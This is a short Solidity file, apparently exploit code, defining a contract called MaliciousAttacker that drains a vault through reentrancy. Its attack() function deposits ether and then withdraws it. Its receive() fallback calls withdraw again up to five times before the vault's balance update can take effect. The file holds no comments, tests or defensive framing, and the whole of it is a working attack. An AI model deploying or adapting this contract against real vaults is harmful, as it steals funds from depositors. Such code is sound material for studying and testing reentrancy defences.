// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract MaliciousAttacker {
    IVault public vault;
    uint256 public attackCount;
    
    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 5) {
            vault.withdraw(msg.value);
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
}
